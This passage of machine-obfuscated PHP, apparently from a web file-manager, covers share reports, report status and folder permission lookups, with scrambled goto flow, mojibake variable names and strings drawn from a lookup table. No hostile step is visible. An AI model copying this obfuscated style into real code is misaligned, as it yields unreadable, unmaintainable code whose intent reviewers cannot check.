$B©‚®ĞÂÎ¶[$AíÎßâÆ‰[450]], $AíÎßâÆ‰[1505] => USER_ID, $AíÎßâÆ‰[39] => $B©‚®ĞÂÎ¶[$AíÎßâÆ‰[39]], $AíÎßâÆ‰[434] => $B©‚®ĞÂÎ¶[$AíÎßâÆ‰[434]]); return Model($AíÎßâÆ‰[1823])->add($Cä…‚Š“ì­); } public function reportList($CøÁÑ¦à) { goto BÒĞƒŸøÈä; cÅË‘àëÅ: if (isset($CøÁÑ¦à[$EÊÂ½ìŠŞ¾[39]]) && in_array($CøÁÑ¦à[$EÊÂ½ìŠŞ¾[39]], array($EÊÂ½ìŠŞ¾[96], $EÊÂ½ìŠŞ¾[1828], $EÊÂ½ìŠŞ¾[1829], $EÊÂ½ìŠŞ¾[1830], $EÊÂ½ìŠŞ¾[1831]))) { $dïÁØù®Š§[$EÊÂ½ìŠŞ¾[39]] = $CøÁÑ¦à[$EÊÂ½ìŠŞ¾[39]]; } if (isset($CøÁÑ¦à[$EÊÂ½ìŠŞ¾[711]]) && in_array($CøÁÑ¦à[$EÊÂ½ìŠŞ¾[711]], array($EÊÂ½ìŠŞ¾[500], $EÊÂ½ìŠŞ¾[96], $EÊÂ½ìŠŞ¾[1828], $EÊÂ½ìŠŞ¾[1829]))) { $dïÁØù®Š§[$EÊÂ½ìŠŞ¾[711]] = $CøÁÑ¦à[$EÊÂ½ìŠŞ¾[711]]; } $E‡ÆšÛÅ– = Input::get($EÊÂ½ìŠŞ¾[439], $EÊÂ½ìŠŞ¾[17], $EÊÂ½ìŠŞ¾[1827], array($EÊÂ½ìŠŞ¾[1751], $EÊÂ½ìŠŞ¾[433])); goto a‡¹‰Ÿ‘Ì; BÒĞƒŸøÈä: $EÊÂ½ìŠŞ¾ =& $_SERVER[¾÷]; $dïÁØù®Š§ = array(); if ($CøÁÑ¦à[$EÊÂ½ìŠŞ¾[724]]) { $FÃ×ŠÒ´ñŞ = $CøÁÑ¦à[$EÊÂ½ìŠŞ¾[479]] ? $CøÁÑ¦à[$EÊÂ½ìŠŞ¾[479]] : strtotime(date($EÊÂ½ìŠŞ¾[1825])); $dïÁØù®Š§[$EÊÂ½ìŠŞ¾[202]] = array($EÊÂ½ìŠŞ¾[338], array($CøÁÑ¦à[$EÊÂ½ìŠŞ¾[724]], $FÃ×ŠÒ´ñŞ)); } goto cÅË‘àëÅ; Aì—¾ê‚Ñ¼: if (empty($Aˆ¤ëˆœÖ¾[$EÊÂ½ìŠŞ¾[374]])) { return array(); } $bŞ³‘¬ŞÒ™ = array_to_keyvalue_group($Aˆ¤ëˆœÖ¾[$EÊÂ½ìŠŞ¾[374]], $EÊÂ½ìŠŞ¾[711], $EÊÂ½ìŠŞ¾[471]); if (!empty($bŞ³‘¬ŞÒ™[0])) { $CøÁÑ¦à = $bŞ³‘¬ŞÒ™[0]; $dïÁØù®Š§ = array($EÊÂ½ìŠŞ¾[471] => array($EÊÂ½ìŠŞ¾[17], $CøÁÑ¦à)); $E†—‹Êğäø = $this->where($dïÁØù®Š§)->field($EÊÂ½ìŠŞ¾[471])->select(); $E†—‹Êğäø = array_to_keyvalue($E†—‹Êğäø, $EÊÂ½ìŠŞ¾[43], $EÊÂ½ìŠŞ¾[471]); $A«¶Š£¬¢ö = array_diff($CøÁÑ¦à, $E†—‹Êğäø); if (!empty($A«¶Š£¬¢ö)) { foreach ($Aˆ¤ëˆœÖ¾[$EÊÂ½ìŠŞ¾[374]] as $BÏÒ¤‘î²Â => $Fç£ñ•íÅê) { if (in_array($Fç£ñ•íÅê[$EÊÂ½ìŠŞ¾[471]], $A«¶Š£¬¢ö)) { unset($Aˆ¤ëˆœÖ¾[$EÊÂ½ìŠŞ¾[374]][$BÏÒ¤‘î²Â]); } } } } goto cÓ¤ï¶¤; a‡¹‰Ÿ‘Ì: $c•ìºö‚èÓ = array($EÊÂ½ìŠŞ¾[431] => $EÊÂ½ìŠŞ¾[432], $EÊÂ½ìŠŞ¾[433] => $EÊÂ½ìŠŞ¾[434]); $C¦¥½˜ÛğÀ = $EÊÂ½ìŠŞ¾[1832] . $c•ìºö‚èÓ[$E‡ÆšÛÅ–]; $Aˆ¤ëˆœÖ¾ = Model($EÊÂ½ìŠŞ¾[1823])->where($dïÁØù®Š§)->order($C¦¥½˜ÛğÀ)->selectPage(20); goto Aì—¾ê‚Ñ¼; cÓ¤ï¶¤: $this->_listDataApply($Aˆ¤ëˆœÖ¾[$EÊÂ½ìŠŞ¾[374]]); return $Aˆ¤ëˆœÖ¾; goto aÉØ–¾›òí; aÉØ–¾›òí: } public function reportStatus($D»®µÎá§ğ) { goto AåäÈ£”ö˜; AåäÈ£”ö˜: $dó¸îåÅ’Ö =& $_SERVER[¾÷]; $cÙÇâ—àŠç = array($dó¸îåÅ’Ö[397] => $D»®µÎá§ğ[$dó¸îåÅ’Ö[397]]); $b‚æ…ÚÏÛä = Model($dó¸îåÅ’Ö[1823])->where($cÙÇâ—àŠç)->field($dó¸îåÅ’Ö[1833])->find(); goto A‘°¹™éÕ­; B™†¢Ú‚Á“: return $eŠ°•…±õ´; goto B£ìâ»ÃªŠ; A‘°¹™éÕ­: if (!$b‚æ…ÚÏÛä) { return !1; } $e’½Â”Ó = array($dó¸îåÅ’Ö[711] => $D»®µÎá§ğ[$dó¸îåÅ’Ö[711]]); if ($D»®µÎá§ğ[$dó¸îåÅ’Ö[711]] == $dó¸îåÅ’Ö[1829] && $b‚æ…ÚÏÛä[$dó¸îåÅ’Ö[711]] == $dó¸îåÅ’Ö[1829]) { $e’½Â”Ó[$dó¸îåÅ’Ö[711]] = 0; } goto E¯×µ©İì‰; E¯×µ©İì‰: $eŠ°•…±õ´ = Model($dó¸îåÅ’Ö[1823])->where($cÙÇâ—àŠç)->save($e’½Â”Ó); if ($D»®µÎá§ğ[$dó¸îåÅ’Ö[711]] == $dó¸îåÅ’Ö[1828]) { if ($b‚æ…ÚÏÛä[$dó¸îåÅ’Ö[450]] != $dó¸îåÅ’Ö[500] && $this->shareFileMeta($b‚æ…ÚÏÛä[$dó¸îåÅ’Ö[450]])) { $this->shareFileMeta($b‚æ…ÚÏÛä[$dó¸îåÅ’Ö[450]], 0); } $this->remove($b‚æ…ÚÏÛä[$dó¸îåÅ’Ö[471]]); return !0; } if ($eŠ°•…±õ´ && $D»®µÎá§ğ[$dó¸îåÅ’Ö[711]] == $dó¸îåÅ’Ö[1829]) { $aÖ†ùâ‹‘ = $e’½Â”Ó[$dó¸îåÅ’Ö[711]] == $dó¸îåÅ’Ö[1829] ? 1 : 0; $this->shareFileMeta($b‚æ…ÚÏÛä[$dó¸îåÅ’Ö[450]], $aÖ†ùâ‹‘); $this->removeByFile($b‚æ…ÚÏÛä[$dó¸îåÅ’Ö[450]]); } goto B™†¢Ú‚Á“; B£ìâ»ÃªŠ: } private function removeByFile($f–±Œ“¤ÏÍ) { goto c´é¯–õ¢½; CçÉÛÌóñ: $A·Ÿ¶öª¤Š = array_to_keyvalue($B Üµ¶–‚, $CôÏß¬´£ƒ[43], $CôÏß¬´£ƒ[471]); $this->remove($A·Ÿ¶öª¤Š); goto a«¼´¸Û; FËë”·: $a˜í¨‘‘²´ = array($CôÏß¬´£ƒ[399] => array($CôÏß¬´£ƒ[17], $d‘¤Å‰ƒØš), $CôÏß¬´£ƒ[476] => 1); $B Üµ¶–‚ = $this->where($a˜í¨‘‘²´)->field($CôÏß¬´£ƒ[471])->select(); if (empty($B Üµ¶–‚)) { return; } goto CçÉÛÌóñ; c´é¯–õ¢½: $CôÏß¬´£ƒ =& $_SERVER[¾÷]; $B Üµ¶–‚ = Model($CôÏß¬´£ƒ[776])->where(array($CôÏß¬´£ƒ[450] => $f–±Œ“¤ÏÍ))->field($CôÏß¬´£ƒ[399])->select(); $d‘¤Å‰ƒØš = array_to_keyvalue($B Üµ¶–‚, $CôÏß¬´£ƒ[43], $CôÏß¬´£ƒ[399]); goto FËë”·; a«¼´¸Û: } private function shareFileMeta($D™œåÖ¿Ä·, $e•ÃôÕ„Ø = null) { $DÎƒº±ª =& $_SERVER[¾÷]; $E¶Ùã…óˆù = array($DÎƒº±ª[450] => $D™œåÖ¿Ä·, $DÎƒº±ª[102] => $DÎƒº±ª[1834]); if (is_null($e•ÃôÕ„Ø)) { return Model($DÎƒº±ª[1835])->where($E¶Ùã…óˆù)->find(); } $E¶Ùã…óˆù[$DÎƒº±ª[379]] = $e•ÃôÕ„Ø; Model($DÎƒº±ª[1835])->add($E¶Ùã…óˆù, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\x72\143\145\x5f\141\165\164\x68"; public function getAuth($Aœ”Ç®ÉÍ†) { goto fÔ½åŠ¤«æ; fä«„ƒ•¸: $aÚ§öÉˆ«Î = array(); $cƒŸŠ†—ØÎ = 2 << 25; foreach ($bàöãñÕÃ as $C¢äˆÇ‘—) { goto a·½ñÒÈŞ; a·½ñÒÈŞ: $C‚‡èòëÒ‘ = Model($Cß­Åó‚öĞ[1836])->listData($C¢äˆÇ‘—[$Cß­Åó‚öĞ[1764]]); if (!$C‚‡èòëÒ‘) { continue; } $añŒ†Û’[] = $C¢äˆÇ‘—; goto B–ä×æ¸•; CÖò¯Ø’: if ($C¢äˆÇ‘—[$Cß­Åó‚öĞ[407]] == SourceModel::TYPE_USER && $C¢äˆÇ‘—[$Cß­Åó‚öĞ[487]] == $Cß­Åó‚öĞ[500]) { $aãÓÂÓç£´ = 0; } $aÚ§öÉˆ«Î[] = $C‚‡èòëÒ‘[$Cß­Åó‚öĞ[409]] + $aãÓÂÓç£´; goto dÒª÷Ş“˜’; B–ä×æ¸•: $aãÓÂÓç£´ = 0; if ($C¢äˆÇ‘—[$Cß­Åó‚öĞ[407]] == SourceModel::TYPE_GROUP) { $aãÓÂÓç£´ = $cƒŸŠ†—ØÎ * 2; } if ($C¢äˆÇ‘—[$Cß­Åó‚öĞ[407]] == SourceModel::TYPE_USER) { $aãÓÂÓç£´ = $cƒŸŠ†—ØÎ; } goto CÖò¯Ø’; dÒª÷Ş“˜’: } goto FÓ±Â®‘­; fÔ½åŠ¤«æ: $Cß­Åó‚öĞ =& $_SERVER[¾÷]; $bàöãñÕÃ = $this->sourceAuthSelect($Aœ”Ç®ÉÍ†); $añŒ†Û’ = array(); goto fä«„ƒ•¸; FÓ±Â®‘­: array_multisort($aÚ§öÉˆ«Î, SORT_DESC, $añŒ†Û’); return $añŒ†Û’; goto eÉã¥ĞÈÈâ; eÉã¥ĞÈÈâ: } public function sourceAuthSelect($b÷ÅÙ‚İ‰·) { goto C‡šîÍÃéÒ; fˆÆ×çÖÀ‹: $có†ì©‰¤¢ = $this->field($C± æª¤î¥)->order($BµÂÂÖ³š¼[397])->where($Fõ˜İ‰‚Öà)->select(); $cƒƒØ¨¢ª = array_to_keyvalue_group($có†ì©‰¤¢, $BµÂÂÖ³š¼[399]); foreach ($b÷ÅÙ‚İ‰· as $CíÜ¼‘ß) { $D†•äºëÕ‰[$CíÜ¼‘ß] = $cƒƒØ¨¢ª[$CíÜ¼‘ß] ? $cƒƒØ¨¢ª[$CíÜ¼‘ß] : array(); } goto Aâ’Š°¤Ï¹; aÍÕ¿Ÿ²­‡: if (count($D“àŠ‡¬ŠĞ) == count($b÷ÅÙ‚İ‰·)) { return $Böğ¸‰™Œ— ? $D“àŠ‡¬ŠĞ[$b÷ÅÙ‚İ‰·[0]] : $D“àŠ‡¬ŠĞ; } $C± æª¤î¥ = $BµÂÂÖ³š¼[1837]; $Fõ˜İ‰‚Öà = array($BµÂÂÖ³š¼[399] => array($BµÂÂÖ³š¼[17], $b÷ÅÙ‚İ‰·)); goto fˆÆ×çÖÀ‹; Aâ’Š°¤Ï¹: if ($Böğ¸‰™Œ—) { return $có†ì©‰¤¢; } return $cƒƒØ¨¢ª; goto dŠÏĞìŸƒŠ; FêµùøÀŒÓ: if ($Böğ¸‰™Œ—) { $b÷ÅÙ‚İ‰· = array($b÷ÅÙ‚İ‰·); } $D“àŠ‡¬ŠĞ = array(); foreach ($b÷ÅÙ‚İ‰· as $CíÜ¼‘ß) { if (isset($D†•äºëÕ‰[$CíÜ¼‘ß])) { $D“àŠ‡¬ŠĞ[$CíÜ¼‘ß] = $D†•äºëÕ‰[$CíÜ¼‘ß]; } } goto aÍÕ¿Ÿ²­‡; C‡šîÍÃéÒ: $BµÂÂÖ³š¼ =& $_SERVER[¾÷]; static $D†•äºëÕ‰ = array(); $Böğ¸‰™Œ— = is_array($b÷ÅÙ‚İ‰·) ? !1 : !0; goto FêµùøÀŒÓ; dŠÏĞìŸƒŠ: } public function setAuth($BéŠÊ¯Ö“, $d«‰Ç”Ïµ) { goto cùÙÓ¬îÖ; CîˆËî‡èœ: return !0; goto c†¥ÎïÆìŠ; cùÙÓ¬îÖ: $d•à ¹™¤ =& $_SERVER[¾÷]; $FœÖ‡ŠêÜš = Model($d•à ¹™¤[1180])->sourceInfo($BéŠÊ¯Ö“); if (!$FœÖ‡ŠêÜš) { return !1; } goto EÙÃ¤ç¡‹Í; EÙÃ¤ç¡‹Í: if ($FœÖ‡ŠêÜš[$d•à ¹™¤[407]] != SourceModel::TYPE_GROUP) { return !1; } $b‡‚šÛ™ò = 1; $d»îç¶ÍÈ = $FœÖ‡ŠêÜš[$d•à ¹™¤[487]]; goto aºÈÇˆÌøÏ; AçóˆêôÈ£: foreach ($d«‰Ç”Ïµ as $a˜Ê„ßˆó) { if (!in_array($a˜Ê„ßˆó[$d•à ¹™¤[407]], $B„¥Ö¦¸ç­)) { show_json(LNG($d•à ¹™¤[1838]), !1); } if ($d»îç¶ÍÈ != $b‡‚šÛ™ò) { if ($a˜Ê„ßˆó[$d•à ¹™¤[407]] == SourceModel::TYPE_GROUP) { } if ($a˜Ê„ßˆó[$d•à ¹™¤[487]] != 0 && !in_array($a˜Ê„ßˆó[$d•à ¹™¤[487]], $cÄÒìòÕµö)) { } } if ($a˜Ê„ßˆó[$d•à ¹™¤[487]] == 0) { $a˜Ê„ßˆó[$d•à ¹™¤[407]] = SourceModel::TYPE_USER; } $cèË¸ñÒß[] = array($d•à ¹™¤[399] => $BéŠÊ¯Ö“, $d•à ¹™¤[407] => intval($a˜Ê„ßˆó[$d•à ¹™¤[407]]), $d•à ¹™¤[487] => intval($a˜Ê„ßˆó[$d•à ¹™¤[487]]), $d•à ¹™¤[1764] => intval($a˜Ê„ßˆó[$d•à ¹™¤[1764]]) ? intval($a˜Ê„ßˆó[$d•à ¹™¤[1764]]) : 0, $d•à ¹™¤[1818] => intval($a˜Ê„ßˆó[$d•à ¹™¤[1818]]) ? intval($a˜Ê„ßˆó[$d•à ¹™¤[1818]]) : -1); } $this->where(array($d•à ¹™¤[413] => $BéŠÊ¯Ö“))->delete(); $this->addAll($cèË¸ñÒß); goto CîˆËî‡èœ; aºÈÇˆÌøÏ: if ($d»îç¶ÍÈ != $b‡‚šÛ™ò) { $BùÑèİñô­ = array($d•à ¹™¤[1668] => $d»îç¶ÍÈ); $cÄÒìòÕµö = Model($d•à ¹™¤[1750])->field($d•à ¹™¤[1505])->where($BùÑèİñô­)->select(); $cÄÒìòÕµö = array_to_keyvalue($cÄÒìòÕµö, $d•à ¹™¤[43], $d•à ¹™¤[1505]); } $B„¥Ö¦¸ç­ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $cèË¸ñÒß = array(); goto AçóˆêôÈ£; c†¥ÎïÆìŠ: } public function authClear($fâø®Š) { $F¸âªš¨¶Ş =& $_SERVER[¾÷]; $AŞˆò‘¸Š² = Model($F¸âªš¨¶Ş[1180])->sourceInfo($fâø®Š); $dç¨ Åâ = array($fâø®Š); if ($AŞˆò‘¸Š²[$F¸âªš¨¶Ş[406]] == $F¸âªš¨¶Ş[96]) { $cÄÅ¤ÑÂÉ = array($F¸âªš¨¶Ş[557] => array($F¸âªš¨¶Ş[516], $AŞˆò‘¸Š²[$F¸âªš¨¶Ş[490]] . $fâø®Š . $F¸âªš¨¶Ş[517])); $dç¨ Åâ = Model($F¸âªš¨¶Ş[1180])->field($F¸âªš¨¶Ş[413])->where($cÄÅ¤ÑÂÉ)->getField($F¸âªš¨¶Ş[399], !0); $dç¨ Åâ[] = $fâø®Š; } $this->where(array($F¸âªš¨¶Ş[413] => array($F¸âªš¨¶Ş[414], $dç¨ Åâ)))->delete(); return !0; } public function getAllChildren($F¸Ğ§ĞÙÃÓ) { goto e¦ÔŠã©¾; a‰½ªÑµšƒ: if ($d­ÆÙšç‚Ã[$aÅìÆÖã†[481]] == $aÅìÆÖã†[500] && $d­ÆÙšç‚Ã[$aÅìÆÖã†[487]] != $AŒŒ–ÅÉë) { $f—µÇ‰š×Ÿ = $this->groupChidldAllRootSource($d­ÆÙšç‚Ã[$aÅìÆÖã†[487]]); } $eòÈ£´á° = $this->field($aÅìÆÖã†[399])->group($aÅìÆÖã†[399])->select(); $eòÈ£´á° = array_to_keyvalue($eòÈ£´á°, $aÅìÆÖã†[43], $aÅìÆÖã†[399]); goto c‘çääÕğ; e¬Şø»Œ: return $this->sourceListAuth($bÄ‘™Øç¿À); goto a‡–Ç‘ƒ¡›; c‘çääÕğ: if (!$eòÈ£´á°) { return array(); } $b¸àáÙµ– = $aÅìÆÖã†[1839]; $fÕ…ğ¸ÊÁ = array($aÅìÆÖã†[399] => array($aÅìÆÖã†[17], $eòÈ£´á°), $aÅìÆÖã†[426] => $aÅìÆÖã†[500]); goto C«™ØíÖÎ¼; eêÂèà½æé: if ($d­ÆÙšç‚Ã[$aÅìÆÖã†[407]] != SourceModel::TYPE_GROUP) { return array(); } $AŒŒ–ÅÉë = 1; $f—µÇ‰š×Ÿ = array($F¸Ğ§ĞÙÃÓ); goto a‰½ªÑµšƒ; C«™ØíÖÎ¼: $FàŠ–Ééàè = Model($aÅìÆÖã†[776])->field($b¸àáÙµ–)->where($fÕ…ğ¸ÊÁ)->select(); $bÄ‘™Øç¿À = array($F¸Ğ§ĞÙÃÓ); foreach ($FàŠ–Ééàè as $dø’“‹§İÙ) { foreach ($f—µÇ‰š×Ÿ as $aÎòŠåˆî–) { $C‹šÆÀ§ñÂ = $aÅìÆÖã†[57] . $aÎòŠåˆî– . $aÅìÆÖã†[57]; $f—‰¢…àŸ = $dø’“‹§İÙ[$aÅìÆÖã†[490]] . $dø’“‹§İÙ[$aÅìÆÖã†[399]] . $aÅìÆÖã†[57]; if (strstr($f—‰¢…àŸ, $C‹šÆÀ§ñÂ)) { $bÄ‘™Øç¿À[] = $dø’“‹§İÙ[$aÅìÆÖã†[399]]; break; } } } goto e¬Şø»Œ; e¦ÔŠã©¾: $aÅìÆÖã† =& $_SERVER[¾÷]; $d­ÆÙšç‚Ã = Model($aÅìÆÖã†[1180])->sourceInfo($F¸Ğ§ĞÙÃÓ); if ($d­ÆÙšç‚Ã[$aÅìÆÖã†[406]] != $aÅìÆÖã†[96]) { return $this->sourceListAuth(array($F¸Ğ§ĞÙÃÓ)); } goto eêÂèà½æé; a‡–Ç‘ƒ¡›: } private function sourceListAuth($eƒÍéŞ÷¡) { goto eŸÕËØêÎ ; cïé¸Œİ–ë: $e²¼Š°æì = array(); $a§†ÌŞÍ†¼ = array(); foreach ($eÉØñ’¿©Ä as $dö——æÉÌĞ) { goto aŞĞÅò”ƒÒ; cŞÖÃÄ¢¨Ñ: unset($dö——æÉÌĞ[$BÀ‰³«ŞÂ[94]]); $E¿ƒÕŸµ = $Bß×½æ‰ùö[$dö——æÉÌĞ[$BÀ‰³«ŞÂ[399]]]; if (!$E¿ƒÕŸµ) { continue; } goto f±‡ó«á¼œ; aŞĞÅò”ƒÒ: unset($dö——æÉÌĞ[$BÀ‰³«ŞÂ[437]]); unset($dö——æÉÌĞ[$BÀ‰³«ŞÂ[435]]); unset($dö——æÉÌĞ[$BÀ‰³«ŞÂ[409]]); goto cŞÖÃÄ¢¨Ñ; f±‡ó«á¼œ: $dö——æÉÌĞ[$BÀ‰³«ŞÂ[1840]] = $this->authTargetInfo($E¿ƒÕŸµ); $dö——æÉÌĞ[$BÀ‰³«ŞÂ[498]] = rtrim($dö——æÉÌĞ[$BÀ‰³«ŞÂ[493]], $BÀ‰³«ŞÂ[18]) . $BÀ‰³«ŞÂ[18] . ltrim($dö——æÉÌĞ[$BÀ‰³«ŞÂ[498]], $BÀ‰³«ŞÂ[18]); $e²¼Š°æì[] = $dö——æÉÌĞ; goto cÙäŞââ­Ê; cÙäŞââ­Ê: $EéøóÕºæË = count(explode($BÀ‰³«ŞÂ[18], trim($dö——æÉÌĞ[$BÀ‰³«ŞÂ[498]], $BÀ‰³«ŞÂ[18]))); $a§†ÌŞÍ†¼[] = $EéøóÕºæË + ($dö——æÉÌĞ[$BÀ‰³«ŞÂ[39]] == $BÀ‰³«ŞÂ[86] ? 0 : 1000); goto d—ê•ïø; d—ê•ïø: } goto føøÖ¦…ÃÙ; føøÖ¦…ÃÙ: array_multisort($a§†ÌŞÍ†¼, SORT_ASC, $e²¼Š°æì); return $e²¼Š°æì; goto bŒ¨¶Çšã‰; eŸÕËØêÎ : $BÀ‰³«ŞÂ =& $_SERVER[¾÷]; $eÉØñ’¿©Ä = Model($BÀ‰³«ŞÂ[1180])->sourceListInfo($eƒÍéŞ÷¡, !0); $Bß×½æ‰ùö = $this->sourceAuthSelect($eƒÍéŞ÷¡); goto cïé¸Œİ–ë; bŒ¨¶Çšã‰: } private function groupChidldAllRootSource($B‹Ä¿ˆ¤Å­) { $Eççô¹„Ï =& $_SERVER[¾÷]; $FØŠ£ºÉÁÃ = Model($Eççô¹„Ï[1841])->groupChildrenAll($B‹Ä¿ˆ¤Å­); $Aµ“©éßÛê = array($Eççô¹„Ï[481] => 0, $Eççô¹„Ï[487] => array($Eççô¹„Ï[17], $FØŠ£ºÉÁÃ), $Eççô¹„Ï[407] => SourceModel::TYPE_GROUP); $FßÑÆÀºõ = Model($Eççô¹„Ï[776])->field($Eççô¹„Ï[399])->where($Aµ“©éßÛê)->select(); $FßÑÆÀºõ = array_to_keyvalue($FßÑÆÀºõ, $Eççô¹„Ï[43], $Eççô¹„Ï[399]); return $FßÑÆÀºõ; } private function authTargetInfo($BÚó·õï¿) { goto Cö¿Äé½œ™; c¥½À¦Ìà: $bâ…˜¹êä = 2 << 25; foreach ($BÚó·õï¿ as $c¤‚÷å‡®²) { goto cñğ‘ë‹ë ; f—†°ÁĞ£‹: if (!$d×Ğ†¶ï†) { continue; } $d×Ğ†¶ï†[$E’æáãÖ£[449]] = $e™œ×¶­‹; $AÆ¦ÂØÃÙ[] = $d×Ğ†¶ï†; goto D‰äËëÑ¡; cñğ‘ë‹ë : $e™œ×¶­‹ = Model($E’æáãÖ£[1836])->listData($c¤‚÷å‡®²[$E’æáãÖ£[1764]]); if (!$e™œ×¶­‹) { continue; } if ($c¤‚÷å‡®²[$E’æáãÖ£[407]] == SourceModel::TYPE_USER) { $d×Ğ†¶ï† = Model($E’æáãÖ£[506])->getInfoSimpleOuter($c¤‚÷å‡®²[$E’æáãÖ£[487]]); if ($d×Ğ†¶ï†[$E’æáãÖ£[1505]] == $E’æáãÖ£[1061]) { continue; } if ($d×Ğ†¶ï†[$E’æáãÖ£[1505]] == $E’æáãÖ£[500]) { $d×Ğ†¶ï†[$E’æáãÖ£[38]] = LNG($E’æáãÖ£[1842]); } } else { $d×Ğ†¶ï† = Model($E’æáãÖ£[489])->getInfoSimple($c¤‚÷å‡®²[$E’æáãÖ£[487]]); } goto f—†°ÁĞ£‹; D‰äËëÑ¡: $F³Š©°ÙñÕ = 0; if ($c¤‚÷å‡®²[$E’æáãÖ£[407]] == SourceModel::TYPE_GROUP) { $F³Š©°ÙñÕ = $bâ…˜¹êä * 2; } if ($c¤‚÷å‡®²[$E’æáãÖ£[407]] == SourceModel::TYPE_USER) { $F³Š©°ÙñÕ = $bâ…˜¹êä; } goto AÊ„šæ ò; AÊ„šæ ò: if ($c¤‚÷å‡®²[$E’æáãÖ£[407]] == SourceModel::TYPE_USER && $c¤‚÷å‡®²[$E’æáãÖ£[487]] == $E’æáãÖ£[500]) { $F³Š©°ÙñÕ = 0; } $EïƒìµÏöƒ[] = $e™œ×¶­‹[$E’æáãÖ£[409]] + $F³Š©°ÙñÕ; goto EïìäÂŠ•Î; EïìäÂŠ•Î: } array_multisort($EïƒìµÏöƒ, SORT_DESC, $AÆ¦ÂØÃÙ); goto a¯å¬¿¼î’; Cö¿Äé½œ™: $E’æáãÖ£ =& $_SERVER[¾÷]; $AÆ¦ÂØÃÙ = array(); $EïƒìµÏöƒ = array(); goto c¥½À¦Ìà; a¯å¬¿¼î’: return $AÆ¦ÂØÃÙ; goto F¤’ñª³Ö¿; F¤’ñª³Ö¿: } public function getAllChildrenByUser($e¾íÏß¼İå, $DÎÊî…‡ò) { goto C‰…ËÀõÁï; C‰…ËÀõÁï: $FÈ™ÃŞ©» =& $_SERVER[¾÷]; $DÙ¢ÇÏ“á = Model($FÈ™ÃŞ©»[510])->getInfo($DÎÊî…‡ò); if (!$DÎÊî…‡ò || !$e¾íÏß¼İå || !$DÙ¢ÇÏ“á) { return array(); } goto f³¥âùåØé; f³¥âùåØé: $EÒ¢Ô£Õ = Model($FÈ™ÃŞ©»[1180])->sourceInfo($e¾íÏß¼İå); $CŒ¨Ş¹·ˆ = array(); $fº·†‰ÚØÅ = 1; goto C‚Úòøèç; C‚Úòøèç: if ($EÒ¢Ô£Õ[$FÈ™ÃŞ©»[481]] == $FÈ™ÃŞ©»[500] && $EÒ¢Ô£Õ[$FÈ™ÃŞ©»[487]] != $fº·†‰ÚØÅ && $this->groupContainUser($EÒ¢Ô£Õ[$FÈ™ÃŞ©»[487]], $DÎÊî…‡ò)) { foreach ($DÙ¢ÇÏ“á[$FÈ™ÃŞ©»[1843]] as $e‚÷¯ë) { $Eš¯Åˆæ‘ = Model($FÈ™ÃŞ©»[489])->getInfo($e‚÷¯ë[$FÈ™ÃŞ©»[1668]]); $eÂ®¢¦óÉ = Model($FÈ™ÃŞ©»[510])->getInfoSimpleOuter($DÎÊî…‡ò); $eÂ®¢¦óÉ[$FÈ™ÃŞ©»[449]] = $e‚÷¯ë[$FÈ™ÃŞ©»[409]]; if (Model($FÈ™ÃŞ©»[1836])->authCheckAction($e‚÷¯ë[$FÈ™ÃŞ©»[409]][$FÈ™ÃŞ©»[409]], $FÈ™ÃŞ©»[1688])) { continue; } $C¡ ÂĞã‘ñ = array($FÈ™ÃŞ©»[38] => $FÈ™ÃŞ©»[1457] . $Eš¯Åˆæ‘[$FÈ™ÃŞ©»[38]], $FÈ™ÃŞ©»[399] => $Eš¯Åˆæ‘[$FÈ™ÃŞ©»[94]][$FÈ™ÃŞ©»[399]], $FÈ™ÃŞ©»[85] => KodIO::make($Eš¯Åˆæ‘[$FÈ™ÃŞ©»[94]][$FÈ™ÃŞ©»[399]]), $FÈ™ÃŞ©»[481] => $FÈ™ÃŞ©»[500], $FÈ™ÃŞ©»[407] => $FÈ™ÃŞ©»[992], $FÈ™ÃŞ©»[39] => $FÈ™ÃŞ©»[521], $FÈ™ÃŞ©»[498] => $Eš¯Åˆæ‘[$FÈ™ÃŞ©»[494]], $FÈ™ÃŞ©»[1668] => $Eš¯Åˆæ‘[$FÈ™ÃŞ©»[1668]], $FÈ™ÃŞ©»[491] => $Eš¯Åˆæ‘[$FÈ™ÃŞ©»[481]], $FÈ™ÃŞ©»[1840] => array($eÂ®¢¦óÉ)); $CŒ¨Ş¹·ˆ[$C¡ ÂĞã‘ñ[$FÈ™ÃŞ©»[399]]] = $C¡ ÂĞã‘ñ; } } $d„´ãæÇ°³ = array(); $D °®„¯³æ = $this->getAllChildren($e¾íÏß¼İå); goto D½ÖÇÛ‚½®; D½ÖÇÛ‚½®: foreach ($D °®„¯³æ as $Cğ»¥ØƒÉ«) { $bì‘²ö¸ Ì = !1; foreach ($Cğ»¥ØƒÉ«[$FÈ™ÃŞ©»[1840]] as $FÉ““¤¼ğĞ) { if ($FÉ““¤¼ğĞ[$FÈ™ÃŞ©»[1505]]) { if ($FÉ““¤¼ğĞ[$FÈ™ÃŞ©»[1505]] == $DÎÊî…‡ò) { $bì‘²ö¸ Ì = !0; break; } } if ($FÉ““¤¼ğĞ[$FÈ™ÃŞ©»[1668]]) { if ($this->groupContainUser($FÉ““¤¼ğĞ[$FÈ™ÃŞ©»[1668]], $DÎÊî…‡ò)) { $bì‘²ö¸ Ì = !0; break; } } } if ($bì‘²ö¸ Ì) { $d„´ãæÇ°³[] = $Cğ»¥ØƒÉ«; } $F…ƒÇÂˆ‹î = $Cğ»¥ØƒÉ«[$FÈ™ÃŞ©»[399]]; if (isset($CŒ¨Ş¹·ˆ[$F…ƒÇÂˆ‹î])) { $Cğ»¥ØƒÉ«[$FÈ™ÃŞ©»[1840]][] = $CŒ¨Ş¹·ˆ[$F…ƒÇÂˆ‹î][0]; $CŒ¨Ş¹·ˆ[$F…ƒÇÂˆ‹î] = !1; } } $CŒ¨Ş¹·ˆ = array_filter(array_values($CŒ¨Ş¹·ˆ)); $d„´ãæÇ°³ = array_merge($CŒ¨Ş¹·ˆ, $d„´ãæÇ°³); goto B„¯ÉĞµËÑ; B„¯ÉĞµËÑ: return $d„´ãæÇ°³; goto B¬ÙÄ¦˜‡; B¬ÙÄ¦˜‡: } public function setAllChildrenByUser($EÔÏ¥†›‹Ñ, $dö÷Ğ”ÈÆÀ, $d×éí’ÂÆê) { $cÜ°ñĞ·ÜÌ =& $_SERVER[¾÷]; $e·½ĞñŠòº = $this->getAllChildrenByUser($EÔÏ¥†›‹Ñ, $dö÷Ğ”ÈÆÀ); if (!$d×éí’ÂÆê || !$e·½ĞñŠòº) { return !1; } foreach ($e·½ĞñŠòº as 